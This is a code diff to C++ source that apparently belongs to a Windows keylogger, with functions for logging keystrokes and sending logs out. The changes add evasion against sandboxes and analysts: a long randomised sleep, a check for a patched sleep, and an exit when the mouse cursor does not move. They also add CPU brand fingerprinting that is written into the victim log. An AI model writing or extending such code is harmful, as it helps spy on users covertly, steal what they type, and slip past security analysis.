@@ -24,6 +24,8 @@
 #include <time.h>
 #include <taskschd.h>
 #include <assert.h>
+#include <intrin.h>
+#include <array>
 //#include "lz4/lz4.h"
 //#include <Wbemidl.h>
 //#include <wbemcli.h>
@@ -70,7 +72,7 @@ using buffer = std::vector<char>;
 #pragma comment( lib, "comsuppw.lib" )
 //#pragma comment(lib, "Wbemuuid.lib.")
 
-#define debug
+//#define debug
 
 FILE* OUTPUT_FILE;
 
@@ -90,6 +92,7 @@ void LogItInt(int key_stroke, std::string FileName);
 void LogItChar(std::string Value, std::string FileName);
 void SendLog(std::string CurrentLog);
 ULONG WINAPI Protect(LPVOID);
+std::string GetCpuInfo();
 //void Compress(const buffer& in, buffer& out);
 
 int main()
@@ -112,18 +115,25 @@ int main()
 
 #ifndef debug
 
+
+    POINT position1, position2;
     int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
 
     for (int j = 0; j <= Divider; j++) {
         Sleep(DividedSleep);
     }
 
+    GetCursorPos(&position1);
     DWORD PatchCheck = GetTickCount();
     
     if ((int)(PatchCheck - Tick1) < Time - 5000) {
         PatchedMe = true;
     }
 
+    GetCursorPos(&position2);
+    if ((position1.x == position2.x) && (position1.y == position2.y)) {
+        exit(3);
+    }
 
     unsigned long ThreadId;
     CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
@@ -152,6 +162,7 @@ Log:
     std::string OEMText = "OEM Number:";
     std::string CPUNumberText = "Number Of Cores:";
     std::string CPUTypeText = "CPU Type:";
+    std::string CPUBrand = "CPU Brand And Model:";
     std::string GenuineText = "Genuine Windows:";
     std::string SlowText = "Low-End CPU:";
     std::string MouseText = "Number Of Mouse Buttons:";
@@ -449,6 +460,9 @@ Log:
 
     CPUTypeText += CPUType;
     LogItChar(CPUTypeText, CurrentLog);
+
+    CPUBrand += GetCpuInfo();
+    LogItChar(CPUBrand, CurrentLog);
 
     GenuineText += IsGenuine;
     LogItChar(GenuineText, CurrentLog);
@@ -1087,6 +1101,26 @@ ULONG WINAPI Protect(LPVOID Parameter) {
         Sleep(200);
     }
     return 0;
+}
+
+std::string GetCpuInfo()
+{
+    std::array<int, 4> integerBuffer = {};
+    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();
+    std::array<char, 64> charBuffer = {};
+    constexpr std::array<int, 3> functionIds = {
+        0x8000'0002,
+        0x8000'0003,
+        0x8000'0004
+    };
+    std::string cpu;
+    for (int id : functionIds)
+    {
+        __cpuid(integerBuffer.data(), id);
+        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
+        cpu += std::string(charBuffer.data());
+    }
+    return cpu;
 }
 
 
